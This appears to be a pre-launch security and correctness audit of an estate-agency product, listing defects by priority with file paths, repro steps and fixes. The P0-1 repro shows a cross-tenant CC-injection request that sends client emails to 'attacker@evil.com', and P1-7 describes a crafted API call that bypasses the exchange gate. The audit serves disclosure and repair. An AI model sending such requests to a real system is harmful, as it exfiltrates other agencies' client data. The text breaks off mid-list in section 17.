# TSP Pre-Launch Final Sign-Off Audit

**Date:** 2026-09-12
**Scope:** Whole-product launch-readiness audit ahead of distributing the free self-managed tier to ~100 estate agents who self-onboard unaided.
**Method:** Read-only. Ten parallel investigation streams traced real read/write paths, crons, webhooks, the Prisma model and the rendering components across signup, milestones, relist/hold, tasks/chasing, email, portal, documents, chains, exchange/completion, billing, background jobs, integrations, cross-system consistency, dead code, copy and mobile/PWA. No code, schema, copy or data was modified.

A note on confidence: this is a **static** audit. Items tagged "Strongly suspected" or "Needs runtime verification" are logically confirmed in code but their real-world firing depends on timing or production data shapes I could not exercise. Several of the most serious findings were reported **independently by more than one stream** (billing double-charge, transaction-status gating, email double-send, the `daysStuckOnMilestone` divergence) — noted inline, because convergence raises confidence.

---

## 1. Executive verdict

**Would I personally put *this* version in front of 100 independent estate agents next week?**

## → YES, AFTER P0/P1 FIXES.

Plain English: this is a genuinely mature, carefully-engineered product, not a prototype. The things that usually sink a launch are in good shape here — the multi-tenant access-scope helper is used correctly on the high-traffic paths, portal tokens are unguessable with dead-round guards and document signing, exchange billing stamping is idempotent, the chasing pipelines ship **off** behind kill-switches, the milestone engine has real race guards and atomic cascades, and the empty/onboarding states guide a new user rather than dead-ending them. Multiple independent reviewers said the same thing: the codebase is "unusually disciplined."

But it is **not** clean enough to aggressively onboard strangers next week without a focused fix pass. There is:

- **One unambiguous P0** — a cross-agency data leak where any logged-in user can silently CC themselves on another agency's client/solicitor emails.
- **A cluster of P1s that a normal agent or client will realistically hit** — the client portal does not consult transaction status (a withdrawn sale still lets the client confirm milestones and fire emails), a relisted file shows the *previous* buyer's progress to the seller, milestone-confirmation emails can fail silently yet be logged as "sent," and the same confirmation email can double-send.
- **A P0-severity billing defect** (double-charge on a mid-run failure) that — importantly — the *free self-managed launch cohort will not trigger*, but which must be fixed before you rely on outsourced billing.
- **An onboarding trap** (every self-signup mints a brand-new agency, with no "join your colleagues" path) that will fragment real agencies into several single-person tenants.

None of these are architectural; they are bounded, mostly small fixes. Close the P0 and the P1s below and I would be comfortable. Launch *as-is* and a meaningful fraction of those 100 agents will hit something that makes them think "that's wrong" or "I don't trust this" — with client-facing blast radius.

---

## 2. Launch blockers (P0)

### P0-1 — Any logged-in user can inject a CC address onto another agency's solicitor, silently exfiltrating client comms cross-tenant
- **Files:** `app/api/solicitor-handlers/[id]/route.ts` (whole PATCH handler); `SolicitorContact` model `prisma/schema.prisma:1025` (global, no `agencyId`).
- **What it does now:** The route does a generic `getServerSession` login check, then `prisma.solicitorContact.update({ where: { id }, data: { secondaryEmail } })` with **no ownership/scope check whatsoever**. I verified this directly: there is no `agencyId` filter, no access-scope helper, no "is this handler on one of my files" test. `SolicitorContact` is a **shared global directory row**, and per the schema comment `secondaryEmail` is "CC'd on every email we send this handler (automated chases, exchange-day, and the client's 'email your conveyancer' buttons)… reused across every file that handler is on."
- **Repro:** A negotiator at Agency A reads a shared conveyancer's `SolicitorContact.id` from their own file, then `PATCH /api/solicitor-handlers/<thatId>` with `{"secondaryEmail":"attacker@evil.com"}`. Every other agency (B, C…) that uses that conveyancer now silently CCs `attacker@evil.com` on automated chases, exchange-day emails and client→conveyancer messages — emails carrying property addresses, party names and milestone status.
- **Why it matters:** Cross-tenant exfiltration of client/solicitor communications, triggerable by any authenticated user with no special role. This is exactly the breach class the prompt calls a launch blocker.
- **Confidence:** **Confirmed** (I read the handler end to end). Exploit plausibility high — shared local conveyancers are the norm, and the id is visible on the attacker's own files.
- **Fix:** require the handler to appear on a file in the caller's scope (and ideally director-only), or agency-scope the field.

### P0-2 (conditional) — Month-end invoice issuance can double-charge / over-charge a customer on a mid-run failure
- **Files:** `lib/billing/issuance.ts` (`realStripeIssuer`, `issuePriorMonthInvoices`); `app/api/cron/issue-invoices/route.ts`. **Reported independently by both the billing stream and the jobs stream.**
- **What it does now:** Per invoice it calls `stripe.invoiceItems.create()` for each line, then `stripe.invoices.create({ collection_method: "charge_automatically", auto_advance: true })` (which **sweeps all pending InvoiceItems on that customer**), then persists `stripeInvoiceId`. There is **no Stripe `Idempotency-Key`** on either call and **no per-invoice `try/catch`** in the loop. The only guard is our own `if (inv.stripeInvoiceId) skip`.
- **Repro:** Issuance creates + finalises + charges (auto_advance) → the process crashes/times out before `prisma.invoice.update({ stripeInvoiceId })` commits → next run sees `stripeInvoiceId === null`, re-creates items and a second invoice that sweeps the orphaned items → **customer charged twice / inflated**. A throw mid-loop also aborts the rest of that month's agencies.
- **Why it matters:** Real money, hard to reverse, at the worst possible moment (first billing month). The code comment acknowledges the orphan but mis-frames it as benign — with `auto_advance:true` the orphan has already charged.
- **Why "conditional":** The launch cohort is on the **free self-managed tier and is never billed** (`serviceType === "self_managed"` returns £0 before any stamp — verified). This defect only fires for **outsourced** invoices, and `issue-invoices` runs monthly (`0 5 1 * *`). So it is **not a blocker for the next-week self-managed push**, but it is a genuine P0 for the billing subsystem and must be fixed before the first outsourced issuance month.
- **Confidence:** Confirmed (code) / Strongly suspected (crash-window timing).
- **Fix:** deterministic `Idempotency-Key` (e.g. `issue:${agencyId}:${monthStart}`) on both Stripe calls; per-invoice `try/catch`; create the invoice first and add items to *that* invoice id.

**No other P0s were found.** In particular: no unauthenticated mutating cron, no guessable portal token, no public document URLs, no cross-agency read leak on the main transaction/contact/note/milestone paths, no wrong-recipient email bug, and no self-managed file ever being billed.

---

## 3. Fix before adoption push (P1)

These are things a normal agent or client is realistically likely to hit, with trust or correctness impact.

### P1-1 — The client portal ignores transaction status: a withdrawn sale still lets the client confirm milestones and fire client emails
- **Files:** `lib/services/portal.ts` `getPortalData` (237-350) and `portalCompleteMilestone` (847-913) — neither reads `PropertyTransaction.status`. `components/portal/PortalOverviewHero.tsx:108` is the *only* status-aware element (a small grey "Withdrawn" pill). **Reported independently by the portal stream (B4) and the jobs/data-integrity stream (B2).**
- **What it does now:** On a withdrawn-but-not-yet-relisted file the token still loads a fully live portal: overview, next-action CTA, Confirm buttons, confetti, and the confirmation-email fan-out all still work. Completed files keep the portal live indefinitely.
- **Repro:** Agent withdraws a sale that isn't relisted → client opens their existing link → confirms a milestone → `completeMilestone` runs bilateral counterpart + chain notifications + client emails on a dead sale.
- **Why it matters:** The client cannot tell the sale fell through, and can drive outbound comms on a dead file.
- **Confidence:** Confirmed (code).

### P1-2 — Reversing an exchange/completion milestone leaves the file `status="completed"` while issuing a billing reversal
- **Files:** `app/actions/milestones.ts:645-659`; `lib/services/milestones.ts` reversal paths (1491-1554, 2263-2376) — no inverse of `maybeAutoCompleteTransaction`.
- **What it does now:** Reversing VM19 fires `handleExchangeReversal` (credit note / billing reversal) while the transaction still reports `completed` with VM20/PM27 complete — a billing reversal against a sale the system still calls a completed, billed deal. (Shares a root cause with P1-1: confirm/reverse + portal paths don't consult `status`. A single `status` guard on those entry points closes both.)
- **Confidence:** Confirmed.

### P1-3 — After a relist, the seller's portal shows the *previous* buyer's conveyancing progress
- **Files:** `lib/services/portal.ts:2710-2712` — the vendor branch passes `{}` (no round filter) to the milestone-completion query, vs the purchaser branch which scopes to `forRound(buyerRoundId)`. **Reported by the portal stream (B1) and corroborated by the relist stream (B4, docs) and the consistency stream.**
- **What it does now:** After a relist the old round's PM completions persist with their old `buyerRoundId`. The seller's Updates tab returns completed milestones across **all** rounds, so the seller sees the fallen-through buyer's history ("the buyer's searches came back," "mortgage offer received") interleaved with the new buyer — and it **contradicts** the seller's own Overview/Progress tiles, which *are* active-round scoped.
- **Why it matters:** Shows one party a different (previous) party's progress on the live file, and two surfaces on the same portal disagree, at the most trust-sensitive moment (post-fall-through).
- **Confidence:** Confirmed (code); runtime check on a real two-round file recommended.

### P1-4 — Several portal *write* actions skip the dead-round guard, so an old (superseded) buyer can mutate the live new-buyer file
- **Files:** relist deliberately does not rotate old purchaser tokens (`app/actions/transactions.ts:2644`), relying solely on the `contact.buyerRoundId !== activeBuyerRoundId` guard. That guard is applied on the read path and a few writes, but is **missing** from: `portalSaveCostsAction` (`app/actions/portal.ts:513`), `portalSetExpectedDateAction` (`portal.ts:289`), `sendClientPortalMessage` (`portal-messages.ts:87`), `portalSaveMoveInfoAction` (`portal.ts:556`), `recordPortalSurveyBookingAction` (`portal.ts:181`), `portalLeaveChaseNoteAction` (`portal.ts:442`).
- **What it does now:** The page render is blocked (DeadRoundNotice), but these server actions are independently callable with the still-valid old token. An old buyer can overwrite the **new** buyer's deposit/mortgage figures, snooze the new buyer's live chases, inject speculative dates the agent sees, and post a portal message that is attributed to the **new** round and fires a "{old buyer} replied" push.
- **Note:** The in-code comment claiming "token rotation makes this unreachable" is **stale/false** — relist does not rotate tokens. Anyone reading it would wrongly believe these paths are protected.
- **Confidence:** Confirmed (code); real-world exploitation Strongly suspected.

### P1-5 — Synchronous client emails fail silently and are logged as "sent"
- **Files:** `lib/services/portal.ts:1473` (`logPortalMilestoneConfirm` — `sendEmail(...).catch(()=>{})` then `logAutomatedEmail` unconditionally), `portal.ts:2479/2491` (completion pack), `comms.ts:1355` (`emailVisibleUpdateToClients`). **Corroborated by the jobs stream (D1), which adds `client-weekly-update`, `morning-digest`, `booking-reminders`, `agent-weekly-brief`.**
- **What it does now:** These paths swallow the send error and write the comms/activity row regardless, with no `queueId`, so the bounce webhook can't join a failure back. A **malformed** address (no `@`) passes `isNonDeliverableRecipient`, is handed to SendGrid, rejected, and swallowed. The Activity timeline and "last contacted" then show a completed outbound message with no error.
- **Why it matters:** The "silent send failure shown as success" case. An agent believes the seller was told contracts exchanged when SendGrid rejected it. (The *queued* paths are fine — they stamp `errorAt`/`bouncedAt`.) `JobRun.success` stays `true` because crons catch per-item, so a total SendGrid outage is invisible.
- **Confidence:** Confirmed.

### P1-6 — The same milestone-confirmation email can double-send to a client
- **Files:** `lib/email/milestone-digest-drain.ts` + `lib/email/outboundQueue.ts`. **Reported independently by the email stream (B1) and the jobs stream (D2).**
- **What it does now:** Both `drainMilestoneDigests()` (cron `*/5`) and `drainMilestoneDigestsForFile()` (agent "Send now") select `sentAt: null` rows, call `sendEmail`, and only *then* stamp `sentAt`. There is **no atomic claim** (`UPDATE … WHERE sentAt IS NULL`) and no row lock. An agent clicking "Send now" as the cron fires, two overlapping cron runs, or a crash between send and stamp all double-send. A second path: the portal-side confirm (`portalCompleteMilestone` allows `state==="complete"` through) re-fires the full client fan-out on a double-tap/retry with no dedup.
- **Why it matters:** Duplicate client email at the highest-stakes moment ("Contracts exchanged" sent twice). The enqueue is idempotent (unique index); the gap is purely at drain/send time.
- **Confidence:** Strongly suspected (timing window, real on serverless).

### P1-7 — The exchange gate and "not required" are not enforced server-side; they can be bypassed via a crafted API call
- **Files:** `lib/services/milestones.ts` `completeMilestone` prereq guard (933-958) + `markNotRequired` (1641-1747); `lib/milestone-prerequisites.ts` (VM18/PM25 have no prereq entry); `app/api/milestones/route.ts`; `app/actions/milestones.ts`.
- **What it does now:** VM18/PM25 (the exchange gate) have no `DIRECT_PREREQUISITES`, so the prereq guard is skipped, and neither the agent action nor the API route checks the target milestone's own `locked`/`available` state before completing it. `markNotRequired` never reads `MilestoneDefinition.canBeMarkedNr` — the NR allow-list lives **only** in the client (`MilestoneRow.tsx`). The portal path *does* guard both; the agent action + API route do not.
- **Repro:** `POST /api/milestones {action:"complete", milestoneDefinitionId:<VM18>}` with blockers still incomplete flips VM18 to complete → VM19 then passes → exchange confirmable with required legal steps skipped. Or `{action:"not_required"}` on any milestone (e.g. VM7) succeeds and, because NR counts as "clear," opens the gate.
- **Why it matters:** The exchange gate is the core control of the product and is server-side bypassable. **Not reachable by normal UI clicks** (the agent UI hides the buttons), so it needs a crafted request — which lowers likelihood for a non-technical cohort, but the control should not depend on the client.
- **Confidence:** Confirmed (code path); UI-reachability: not via normal clicks.

### P1-8 — Every self-signup mints a brand-new agency; there is no "join your colleagues" path
- **Files:** `app/api/register/route.ts` + `lib/auth/create-director-with-agency.ts` (always `tx.agency.create`); `app/register/page.tsx:424-427`.
- **What it does now:** Registration unconditionally creates a new Agency. There is no same-domain detection and no warning. The only join mechanism is a director-issued invite, which a colleague can't discover on their own.
- **Repro:** A real agency (director + 3 negotiators) all told "sign up at the link" → **4 separate single-person tenants**. Files fragment, the director can't see colleagues' files, billing is per-agency.
- **Why it matters:** For an *unaided* 100-agency launch this is the single most likely onboarding failure. Partly a deliberate model (invites are the join path — Category E), but the total absence of detection/guidance makes it a real coherence problem at self-serve scale.
- **Confidence:** Confirmed.

---

## 4. Real issues to fix soon (P2)

Real defects/inconsistencies with a workaround or lower likelihood/impact.

**Relist / hold correctness**
- **`markNotRequired` leaves `ClientChaseState` active** → 14 days later the client-escalation pass hands the agent a "client silent — handed to agent" task for a step that is already resolved. `completeMilestone` cancels CCS; `markNotRequired` doesn't, and the escalation pass doesn't re-check milestone state (the *solicitor* pass does self-heal — asymmetry). `lib/services/milestones.ts:1731`, `client-chase-cron.ts:622`.
- **Manual exchange-date override survives relist** and is shown to the new buyer. Relist resets `expectedExchangeDate` but not `overridePredictedDate`, which the portal reads first. `app/actions/transactions.ts:2782`.
- **Resume-after-hold arithmetic is only half hold-aware.** `onTrack` excludes hold time, but `daysStuckOnMilestone`, overdue counts and `daysSinceLastActivity` don't, and `leavingHold` doesn't re-anchor reminder/chase due dates → risk spikes and chases can fire immediately on resume. `lib/services/risk-input.ts`, `transactions.ts:641`.
- **Vendor portal sees the old buyer's shared documents after relist** (no round scope on the vendor `otherShared` filter). `lib/services/portal-documents.ts:51`. (New buyer is correctly scoped — no new-party leak.)
- **Reopening a completed file silently re-completes within 24h** — `completed→active` resets nothing, the nightly safety-net re-flips it. `app/actions/transactions.ts:525`, `completion-safety-net`.

**Chasing robustness (relevant once the pipelines are switched on)**
- **Client-chase duplicate on a post-send bookkeeping failure** — `sentAt` is stamped before the best-effort `commitClientChaseSend`; if the state write throws, the next cron re-enqueues with a new date-keyed `sourceId`. `lib/email/outboundQueue.ts:303`.
- **Solicitor & enquiries chases have no idempotency key** — send-then-record means a state-write failure re-sends next cron. `lib/solicitor-confirm/chase.ts:457`, `lib/enquiries/chase.ts:219`.
- **Multi-day drain backlog → burst of stale chase emails** (negligible at ~5 users, scales poorly).
- **Escalation passes don't re-filter `on_hold`/`withdrawn`** status → a held file >14d produces an internal "unresponsive" hand-off. `client-chase-cron.ts:619`.

**Billing (outsourced only — not hit by the free cohort)**
- **Reversing a "first outsourced file free" exchange credits the band fee that was never charged** (`billing-reversal.ts` branch (b) doesn't read `firstOutsourcedFree`) → silent £250 under-bill later. **Confirmed.**
- **Reversal branch (a) doesn't clear `firstOutsourcedFree`** → a later re-exchange can yield a second free file.
- **Building invoices with no Stripe customer are permanently stranded** — issuance only processes the immediately-prior month, so a building invoice >2 months old is never issued even after a card is added. Revenue leak, no dunning. `lib/billing/issuance.ts`.
- **No handling of Stripe refunds / voids / uncollectible** — the webhook only listens for `payment_succeeded`/`payment_failed`; dashboard adjustments never reconcile. `lib/billing/stripe-webhook.ts`.

**Consistency (see §17)**
- On-track / progress pace is computed three different ways; `daysStuckOnMilestone` diverges between `listTransactions` and `listTransactionsByScope`; "overdue exchange" is computed two ways. All produce surfaces that can disagree about the same file.

**Email / integration observability**
- **Revoked/expired Outlook token fails silently** — the connection isn't flagged, no alert, `JobRun` still records success; Settings still shows "connected." `lib/integrations/outlook/sync.ts:99`, `outlook-sync/route.ts:42`. **Corroborated by two streams.**
- **`data-retention` liveness guard is inert and checks the wrong relation** — under the JWT strategy `sessions.length === 0` is always true, and the "active work" guard checks the internal-SP `assignedTransactions` relation, not the agency owner's `AgentFiles`. The effective guard is only `updatedAt < 3y`. No user is 3y old pre-launch, so it doesn't bite for years, but the guard is broken now. `app/api/cron/data-retention/route.ts:38`.
- **`demo-cleanup` / `rollup-metrics` report success even when work failed** (swallowed errors; no per-scope isolation).

**Security (lower severity)**
- **`GET /api/solicitor-intel` leaks platform-wide cross-agency firm statistics** (`getAllSolicitorIntel` ignores its `agencyId` param) — the same leak class already fixed in the search routes. `lib/services/solicitor-intel.ts:202`.
- **Law-7 ad-hoc `agencyId` filters** on document/status/price/admin-users routes are **fail-closed but broken for internal staff** (a `sales_progressor`/`admin` can't list/upload documents or change status/price on outsourced files). `app/api/transactions/[id]/documents/route.ts`, `.../status`, `.../price`.
- **Document routes skip the per-negotiator `canViewAllFiles` guard** their sibling routes enforce → a restricted negotiator can list/upload docs on any file in their own agency (intra-agency only).
- **Removed/offboarded users keep a working JWT until expiry** — no removal path bumps `sessionVersion`. `lib/auth.ts:220`.
- **`SENDGRID_WEBHOOK_PUBLIC_KEY` unset → bounce webhook signature check is skipped** — if unset in prod, forged bounce events could trigger `suppressUserByEmail` globally. **Confirm the prod env var is set.**

**Mobile / trust**
- **`StatusControl` badge shows a status change that never persisted** — an optimistic flip is never reverted on a thrown action (it only resyncs from a prop that doesn't change without `revalidatePath`). On the most consequential control (withdraw/complete). `components/transaction/StatusControl.tsx:167`. *(Borderline P1.)*
- **Optimistic "complete" not reverted on the exchange-reconciliation drawer error** (`MilestoneRow.tsx:315`), and several agent action buttons lack an in-flight disable (incl. one that double-fires the exchange mutation, `ReconciliationDrawer.tsx:325`).
- **Agent `Drawer` uses `height:100vh`** (Modal correctly uses `100dvh`) → on iOS in-browser the sticky footer actions can sit below the fold. One-line primitive fix, broad payoff. `components/ui/Drawer.tsx:253`.
- **Helper portal revocation (`portalEligible=false`) doesn't block write API routes** — a revoked helper can still upload docs, submit quote requests, and stamp exchange authority with their token. `lib/portal/upload-auth.ts:21`, `give-authority/route.ts`.

**Copy (factual/stale)**
- **Live Terms of Service still references "your free trial"** (removed in the pricing migration), linked from the register consent checkbox. `app/terms/page.tsx` §8.
- **Portal message composer promises replies "by email **or here**"** — in-portal replies don't exist (two-way messaging was declined). `components/portal/PortalMessageCompose.tsx:35`.
- **Help docs have drifted materially** from the shipped onboarding checklist and hub empty-state (6 steps documented vs 8 shipped; contradictory add-negotiator flows; a dead link to a non-existent portal article). Reconcile if `/help` ships at launch, else confirm it's gated.

---

## 5. Product areas that feel unfinished (Category C)

None of these are broken, but a first-time agent may read them as incomplete.

- **Orphaned welcome card with a "Watch a tour (coming soon)" tile** — `components/dashboard/FirstSessionCard.tsx` (Law 13 placeholder). It is **not imported anywhere** (superseded by `HubEmptyState`), so it's dead code rather than a live dead-end — but delete it so it isn't revived.
- **`/agent/completions` has a dead "View all steps" button** behind a hard-coded `SHOW_SETUP_GUIDE=false` flag — a latent Law-13 violation one constant-flip from production. `app/agent/completions/page.tsx:218`.
- **`/command/friction` is a pure "coming soon" placeholder page** — superadmin-only and excluded from the nav, reachable only by hand-typed URL. Return `notFound()` until built.
- **Partial-success masking on multi-file portal upload** — if file 2 fails, file 1 is already saved but the UI shows a single error; retry duplicates file 1. `SearchesUpload.tsx:18`.
- **"Skip survey" swallows errors silently** (empty `catch {}`) — on failure the step silently reappears and the client believes they skipped it. `PortalMilestoneList.tsx:212`.
- **No `app/global-error.tsx`** — a throw in the root layout falls to Next's unstyled default.
- **DemoSalePreview shows self-contradictory dates** ("6 weeks 4 days / Added 22 Jul" next to "Under a minute / Yesterday"; exchange 9 Nov next to 12-week target 29 Nov) in the live "Explore a demo sale" modal.

---

## 6. Trust / confusion risks (Category D)

- **Relist staleness (the user-facing symptom of P1-3/P2 doc scope):** the seller's Overview ring says "Step 3 of 6" while the Updates feed simultaneously shows a completed *previous* buyer's exchange-adjacent milestones — contradictory progress at the most trust-sensitive moment.
- **Diary quick-confirm of exchange throws an opaque `PREREQUISITES_NOT_COMPLETE`** if the opposite side's gate isn't ticked — a confusing dead-end from a one-click control (atomic, so no split state, but the failure is opaque). `app/actions/milestones.ts:587`.
- **Expired Outlook token: Settings still says "connected"** while inbound capture has silently stopped (D2 above).
- **Portal disables pinch-zoom** (`maximumScale:1, userScalable:false`) — an accessibility/trust issue for low-vision clients (WCAG 1.4.4); the agent app correctly does not. Confirm deliberate.
- **"Silent success" fragility** in a few portal handlers that assume the server action *throws* on failure and otherwise flash success — correct today, but a future change to returning `{ok:false}` would flash false success.
- **Post-exchange live `predictedExchangeDate` still recomputes** (`lib/services/fees.ts` `calculateProgress` has no `exchangedAt` short-circuit) — any surface reading the live value rather than the frozen stored column shows a moving forecast for an exchanged file. Needs runtime verification of which surfaces use which.

---

## 7. Logic / progression decisions for Ellis to review (Category E)

**These are NOT bugs.** They are internally coherent; I'm surfacing them because a real scenario exposes a question about the rule.

1. **Sender fallback for unconfigured agencies.** With no verified sender, client/milestone emails send from `updates@thesalesprogressor.co.uk` with the agency's display name and the agent as reply-to. Sending does **not** break without DNS. *Confirm this shared-sender posture is intended for new agencies at launch.* (`lib/email/agency-sender.ts`.)
2. **Low-friction, no-verification signup.** Any email creates a live agency immediately; the only recovery channel (password reset) emails the unverified address. Reasonable for conversion, but combined with P1-8 it raises orphaned/duplicate accounts. *Confirm you accept no email verification.*
3. **Portal tokens never expire and can't be rotated except by relist.** A forwarded link grants indefinite access (UUIDv4, so not brute-forceable). *Confirm whether an explicit revoke/rotate control is wanted* — today the only levers are `portalEligible=false` (leaky for writes, P2-above) and relist.
4. **PM24 (deposit) is manually NR-able in code, but the spec forbids it.** `seed.ts:309` sets `manual_allowed` and the UI offers it; `MILESTONES_SPEC_v1.md` §11 says "Manual NR not permitted." The rationale (buyer whose deposit is locked in a related sale's equity) is sound. *Reconcile spec vs code.*
5. **`NR_CASCADE` carries PM8→PM13 (cash buyers skip searches), not in the spec.** Coherent with the cash-buyer idea but undocumented. *Confirm and document, or drop.*
6. **Completion auto-flip requires both VM20+PM27; the manual status-flip requires only one of each pair.** Two different definitions of "done." *Confirm the asymmetry is acceptable.*
7. **Client auto-chase caps (2 sends, then hand to agent; 14-day silence ceiling; cadence snapshotted per-file at creation so settings edits don't retro-apply).** *Confirm the caps.*
8. **Raise-chase advances its cadence even when the recipient is unreachable** (so the time-based escalation still fires; only the actual `sent` is gated on a real send). *Confirm the counter advancing without a send is intended.*
9. **First-outsourced-free has no concurrency guard** (advisory lock deliberately deferred) — two simultaneous exchanges for one agency could both be free. Acknowledged safe at pre-launch scale. *Confirm acceptable for launch.*
10. **Contacts keep their `buyerRoundId` on the archived round after relist** — this is the dead-round email gate working as designed, not a leak. (Confirmed correct; listed so it isn't mistaken for a bug.)
11. **Hard bounce on any one operational email globally suppresses that user** (all platform email stops until cleared). *Confirm intended.*

---

## 8. Optional improvements (Category F) — kept short

- Add a request timeout / `AbortSignal` to Anthropic calls (a hung AI call is bounded only by `maxDuration`). `lib/anthropic.ts`.
- `backfill-mode-profile` instantiates its own `PrismaClient` (from `scripts/`) that is never `$disconnect`ed in the cron path — latent pooler pressure.
- PWA manifest uses one oversized non-maskable icon → can crop on Android.
- Reset-password could sign the user in directly instead of bouncing to `/login`.
- CRON routes compare directly to `` `Bearer ${CRON_SECRET}` `` — if the env var were ever unset they'd accept `"Bearer undefined"` (defence-in-depth; `/api/reminders/run` already guards this).

---

## 9. Security / permissions verdict

**Core model is sound; one P0 and a short tail.** The access-scope helper (`lib/security/access-scope.ts`) is used correctly on the high-traffic transaction/contact/note/milestone/chase/search paths; IDOR spot-checks on those routes passed. Portal tokens are unguessable `randomUUID()` with dead-round guards and token rotation semantics on relist; the document bucket is private with 1-hour signed URLs and an enforced path prefix; internal notes never reach clients (`visibleToClient` default false); Command Centre API routes enforce `hasSuperAdminPowers` server-side; unauthenticated-by-design endpoints (`/s/`, unsubscribe, pause-chases, whatsapp ingest) are signed-token or bearer gated; all 41 crons require `CRON_SECRET`.

The real risk lives in the **global shared directories** (`SolicitorContact`, `BrokerFirm`/`BrokerContact`) which have no `agencyId` and whose mutation/read routes lack ownership guards — **P0-1** (solicitor-handler CC injection) is the serious one; `broker-firms/[id]/handlers` and `solicitor-intel` are the lower-severity siblings. Secondary items: portal-write revocation gap, removed-user JWT persistence, the fail-closed Law-7 routes, and the bounce-webhook signature toggle. **Fix P0-1 before launch; the rest are P2.**

## 10. Data-integrity verdict

**Good, with a handful of "state not cleared/consulted" gaps rather than corruption.** The active-buyer-round invariant is enforced (atomically re-pointed in the relist `$transaction`), though only procedurally (no DB partial-unique index). Billing history survives transaction deletion (`onDelete: SetNull`). The main integrity risks are: transaction `status` not consulted by portal/milestone paths (P1-1/P1-2), completed↔active reopen re-completing (P2), stale prediction dates persisting through withdraw/hold (P2), old-buyer ManualTasks surviving relist (P3), and `saveChain` hard-deleting the whole chain on re-save if chains ever become multi-transaction (P2, needs runtime verification). Creation is **not atomic** — a mid-sequence failure can orphan a half-built file that then collides with the duplicate-address guard on retry (P2).

## 11. Communications verdict (email / WhatsApp / notifications / recipient safety)

**Recipient selection is safe; delivery reliability and observability are the weak points.** Client emails are keyed by `Contact.roleType` and sent to that contact's own address — vendor/purchaser copy **cannot** be swapped by code, and no wrong-party or wrong-agency send bug was found. Both Outlook and WhatsApp inbound stamp the matched file's `agencyId`, and a shared solicitor address on ≥2 files is routed to human review rather than auto-filed. The gaps: **silent synchronous send failures logged as sent (P1-5)**, **milestone-email double-send (P1-6)**, no inbound capture for client/solicitor replies except via a connected Outlook mailbox (P2), and silent Outlook-token death (P2). The admin/superadmin connected mailbox indexing all agencies is a low-likelihood cross-tenant auto-file residual (needs runtime verification). Notifications are fired from discrete user actions (not crons), so duplicate-on-cron isn't a risk; the morning/booking push dedup is non-atomic but time-gated.

## 12. Client portal verdict

**Isolation architecture is strong; no confirmed P0 leak.** A superseded buyer cannot *view* the live file (layout gate + dead-round notice), the purchaser path is consistently round-scoped, agent-only milestones are server-enforced non-confirmable by clients, and the AI weekly narrative is tightly grounded. The launch-relevant problems are all **status/round staleness and write-path gaps**, not guessable tokens: no transaction-status gating (P1-1), the seller seeing all buyer rounds (P1-3), write actions missing the dead-round guard (P1-4), revocation not cutting writes (P2), and the vendor seeing old shared docs (P2). Fix those and the portal is client-ready.

## 13. Mobile / PWA verdict

**Solid; no P0.** The transaction list ships a real mobile card (not a squashed table), the portal is mobile-first with safe-area insets, and loading/empty/error/not-found boundaries are broad. Crucially, **PWA stale-cache is a non-issue** — `public/sw.js` is push-only (no fetch handler, no Workbox), so deploys reach users normally. Genuine gaps: the agent `Drawer`'s `100vh` footer-clipping on iOS in-browser (P2), optimistic controls that don't revert on error (P1/P2), a few double-submittable buttons, and pinch-zoom disabled on the portal (P2, accessibility). The rest is P3 polish.

## 14. Background jobs / integrations verdict

**Auth and idempotency are mostly good; observability is the systemic weakness.** Every cron is `CRON_SECRET`-gated; the Stripe webhook verifies signatures and is idempotent; `outlook-sync`, `whatsapp ingest`, `detect-problems`, `signals`, `risk-history` and the exchange-day/push jobs are idempotent and/or per-item isolated. The pattern problem is that most crons catch per-item errors and return 200, so **`JobRun.success` stays true even when every send failed** — combined with swallowed email errors (P1-5), a real outage would be invisible until someone noticed a low send count. Specific defects: billing issuance idempotency (P0-2), email-drain double-send (P1-6), `data-retention` guard (P2), and several loops lacking per-row try/catch (one bad row aborts the rest of that run, though idempotent re-runs recover).

## 15. Relist / fall-through verdict

**The relist engine itself is careful and largely correct** — it archives the outgoing round with a snapshot, resets buyer-specific vendor milestones, creates a fresh round + PM set, and runs a thorough three-key chase/reminder/CCS cancellation sweep that is correctly awaited to close the cron race. Hold genuinely suppresses chasing. What leaks through is **buyer-specific state the reset missed**: the `overridePredictedDate` (P2), the portal write paths that don't re-check the round (P1-4), the seller timeline/docs showing the old round (P1-3/P2), `ClientChaseState` not cancelled on `markNotRequired` (P2), and resume-after-hold arithmetic that's only half hold-aware (P2). Pattern: "guard/reset added to the obvious paths, missed on the rest."

---

## 16. First-time-agent walkthrough — where they'd stumble

Running the 20-step journey as a cold, unaided agent:

| Step | Outcome |
|---|---|
| 1–4 Discover → sign up → agency details → empty product | **Smooth.** 2-step register, atomic agency+user create, auto sign-in, guided empty hub with working "Add first sale" + "Explore demo" CTAs. **But:** if colleagues each sign up, they fragment into separate tenants (**P1-8**); if someone picks "Negotiator" as the owner they hit a director-only wall for domain setup (P2). |
| 5–7 Add sale → buyer/seller → solicitors | **Smooth via the form** (it blocks submit until tenure + purchase type are set). A non-form path can create a file with zero milestones (P2), and creation isn't atomic (P2). |
| 8–9 Progress → confirm first milestones | **Works.** Engine is well-guarded. Agents won't hit the server-side gate bypass (P1-7) via normal clicks. |
| 10 Inbound solicitor email | **Works if Outlook is connected.** If the token later dies, capture stops silently and Settings still says "connected" (P2). Replies to the shared-sender address with no connected mailbox are captured by nothing (P2). |
| 11 Send / chase | Chasing pipelines are **off by default** — expected, but confirm the agent understands nothing auto-sends until enabled. A sent email that fails can still show as "sent" (**P1-5**). |
| 12 Invite buyer/seller to portal | **Works.** Clean token, mobile-first. |
| 13 Upload / share document | **Works** (signed URLs, audience scoped). Multi-file partial-failure masking (C). |
| 14 Add / change chain | Works; re-saving a chain can hard-delete the whole chain if multi-tx (P2, verify). |
| 15–16 Hold → resume | Hold suppresses chasing correctly; **resume can spike risk and fire immediate chases** because due dates aren't re-anchored (P2). |
| 17–18 Buyer falls through → add replacement | The engine resets well, **but** the seller then sees the old buyer's progress (**P1-3**), the old buyer can still write via their token (**P1-4**), and a withdrawn-not-relisted file leaves a fully live client portal (**P1-1**). |
| 19–20 Exchange → complete | Exchange stamping/billing is idempotent and solid. Reversing a completion leaves the file "completed" while crediting (P1-2). |

**Net:** a competent agent gets through the happy path unaided. The "probably not" moments are multi-user signup, the relist aftermath (what the seller/old-buyer can see/do), and knowing whether an email actually sent.

---

## 17. Cross-system inconsistencies (duplicated / conflicting sources of truth)

The class the `daysStuckOnMilestone` example belongs to — confirmed instances:

1. **On-track / progress pace — computed three ways:**
   - `listTransactions` / `listTransactionsByScope` / `deriveRiskInput`: **unweighted** `completedCount / totalMilestones` (counts *all* non-retired definitions, NR-inclusive).
